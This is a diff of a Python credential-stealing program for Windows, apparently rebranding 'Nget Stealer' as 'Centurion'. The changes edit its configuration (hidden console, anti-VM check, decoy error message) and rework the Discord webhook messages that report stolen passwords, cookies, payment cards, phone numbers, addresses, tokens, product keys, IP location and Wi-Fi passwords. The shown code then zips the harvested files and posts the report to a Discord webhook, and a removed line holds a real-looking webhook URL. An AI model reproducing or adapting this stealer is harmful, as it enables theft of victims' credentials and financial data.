@@ -7,13 +7,13 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 config = {
-    'webhook': "https://discord.com/api/webhooks/1182948273909137459/sy4h9XpUZFPstS21de9jdqXyaJ_sOLkym7kDarTl4qnRtGpFHWXoAgjVDlaX07WdiDae",  
+    'webhook': "WEBHOOKHERE",  
     'hideconsole': True, 
-    'antivm': False,  
+    'antivm': True,  
     'force_admin': False, 
     'black_screen': True, 
-    'error': True, 
-    'error_message': 'Windows Failed to Create Process for d3d10.dll\nclick "ok" to proceed',
+    'error': False, 
+    'error_message': 'Failed To Open Poop Tool\nclick "ok" to open',
 }
 
 class functions(object):
@@ -61,7 +61,7 @@ class functions(object):
             indent = "│ "
             ret += f"\n{indent*directory_level}<a:earthpink:996004236531859588> {os.path.basename(dirpath)}/"
             for n, f in enumerate(filenames):
-                if f == f'Intrusion-{os.getlogin()}.zip': continue
+                if f == f'Centurion-{os.getlogin()}.zip': continue
                 indent2 = indent if n != len(filenames) - 1 else "└ "
                 ret += f"\n{indent*(directory_level)}{indent2}{f} ({self.fsize((os.path.basename(dirpath)+os.sep if dirpath.split(os.sep)[-1] != internal.tempfolder.split(os.sep)[-1] else '')+f)})"
                 fcount += 1
@@ -594,92 +594,92 @@ Antivirus: {avlist}
             country = data['country']
             region = data['region']
         except Exception: self.exceptions.append(traceback.format_exc())
-        _zipfile = os.path.join(self.tempfolder, f'Intrusion-{os.getlogin()}.zip')
+        _zipfile = os.path.join(self.tempfolder, f'Centurion-{os.getlogin()}.zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
             for filename in files:
-                if filename == f'Intrusion-{os.getlogin()}.zip': continue
+                if filename == f'Centurion-{os.getlogin()}.zip': continue
                 absname = os.path.abspath(os.path.join(dirname, filename))
                 arcname = absname[len(abs_src) + 1:]
                 zipped_file.write(absname, arcname)
         zipped_file.close()
         self.files, self.fileCount = self.gen_tree(self.tempfolder)
         embed = {
-                    "username": f"{os.getlogin()} | nget",
+                    "username": f"{os.getlogin()} | Developed By nget",
                     "content": "@everyone",
-                    "avatar_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&",
+                    "avatar_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg",
                     "embeds": [
                                 {
                                     "author": {
-                                        "name": "Nget Stealer",
+                                        "name": "Centurion",
                                         "url": "",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
                                     },
-                                    "description": f'**{os.getlogin()}** ran Nget Stealer.\n\n'
-                                                   f'<a:dancingblob:873253607749857280>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
-                                                   f'<a:dancingblob:873253607749857280> **{wname}:** ||{wkey if wkey else "No Product Key!"}||\n'
-                                                   f'<a:dancingblob:873253607749857280>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
-                                                   f'<a:dancingblob:873253607749857280>  **City:** {city}\n'
-                                                   f'<a:dancingblob:873253607749857280>  **Region:** {region}\n'
-                                                   f'<a:dancingblob:873253607749857280>  **Country:** {country}\n'
-                                                   f'<a:dancingblob:873253607749857280> Stats\n'
-                                                   f'<a:dancingblob:873253607749857280> Passwords Found: {self.stats["passwords"]}\n'
-                                                   f'<a:dancingblob:873253607749857280> Cookies Found: {self.stats["cookies"]}\n'
-                                                   f'<a:dancingblob:873253607749857280> Phone Numbers Found: {self.stats["phones"]}\n'
-                                                   f'<a:dancingblob:873253607749857280> Cards Found: {self.stats["cards"]}\n'
-                                                   f'<a:dancingblob:873253607749857280> Addresses Found: {self.stats["addresses"]}\n'
-                                                   f'<a:dancingblob:873253607749857280> Tokens Found: {self.stats["tokens"]}\n'
-                                                   f'<a:dancingblob:873253607749857280> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
+                                    "description": f'**{os.getlogin()}** ran Centurion\n\n'
+                                                   f'<a:z_2crown2:1180281277786620034>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
+                                                   f'<a:z_2crown2:1180281277786620034>  **{wname}:** ||{wkey if wkey else "No Product Key!"}||\n'
+                                                   f'<:members:1175028904474464256>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
+                                                   f'<:members:1175028904474464256>  **City:** {city}\n'
+                                                   f'<:members:1175028904474464256>  **Region:** {region}\n'
+                                                   f'<:members:1175028904474464256>  **Country:** {country}\n'
+                                                   f'<:white_stars:1183491791824097301> Stats\n'
+                                                   f'<:white_stars:1183491791824097301> Passwords Found: {self.stats["passwords"]}\n'
+                                                   f'<:white_stars:1183491791824097301> Cookies Found: {self.stats["cookies"]}\n'
+                                                   f'<:white_stars:1183491791824097301> Phone Numbers Found: {self.stats["phones"]}\n'
+                                                   f'<:white_stars:1183491791824097301> Cards Found: {self.stats["cards"]}\n'
+                                                   f'<:white_stars:1183491791824097301> Addresses Found: {self.stats["addresses"]}\n'
+                                                   f'<:white_stars:1183491791824097301> Tokens Found: {self.stats["tokens"]}\n'
+                                                   f'<:white_stars:1183491791824097301> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
                                     "inline": False,
                                     "color": 0x00000,
                                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                     "thumbnail": {
-                                        "url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                        "url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
                                     },
                                     "footer": {
-                                        "text": "Nget Stealer",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                        "text": "Centurion Stealer",
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
                                     }
                                 }
                             ]
                         }         
         fileEmbed = {
-            "username": f"{os.getlogin()} | Nget",
-            "avatar_url":"https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+            "username": f"{os.getlogin()} | Centurion",
+            "avatar_url":"https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
         }
         Network = {
-                    "username": f"Nget Network Stealer",
+                    "username": f"Centurion Network Stealer",
                     "content": "@everyone",
-                    "avatar_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&",
+                    "avatar_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg",
                     "embeds": [
                                 {
                                     "author": {
-                                        "name": "Nget Stealer",
+                                        "name": "Centurion Stealer",
                                         "url": "",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
                                     },
                                     "description": f'**{os.getlogin()}** ran Nget Stealer.\n\n'
-                                                   f'<a:dancingblob:873253607749857280> **Net Profile Names:** ```{profile_names}```\n'
-                                                   f'<a:dancingblob:873253607749857280> **Network Info** ```{profile_info}```\n'
-                                                   f'<a:dancingblob:873253607749857280> **Currently Connected** ```{profile}\n{profile_password}```\n'
-                                                   f'<a:dancingblob:873253607749857280> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
+                                                   f'<:members:1175028904474464256>  **Net Profile Names:** ```{profile_names}```\n'
+                                                   f'<:members:1175028904474464256>  **Network Info** ```{profile_info}```\n'
+                                                   f'<:members:1175028904474464256>  **Currently Connected** ```{profile}\n{profile_password}```\n'
+                                                   f'<:members:1175028904474464256>  Time: {"{:.2f}".format(time.time() - self.starttime)}s',
                                     "inline": False,
                                     "color": 0x00000,
                                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                                     "thumbnail": {
-                                        "url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                        "url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
                                     },
                                     "footer": {
-                                        "text": "Nget Stealer",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+                                        "text": "Centurion",
+                                        "icon_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
                                     }
                                 }
                             ]
                         }         
         fileEmbed = {
-            "username": f"{os.getlogin()} | Nget",
-            "avatar_url":"https://cdn.discordapp.com/attachments/1179997780014534736/1181715439181627533/image0.gif?ex=65821143&is=656f9c43&hm=cee967430b222553a2dafcee186817e60f0c445de5320d7918f0dc79ce75d727&"
+            "username": f"{os.getlogin()} | Developed By nget",
+            "avatar_url":"https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
         }
         with open(_zipfile,'rb') as infozip:
             requests.post(self.webhook, json=embed)
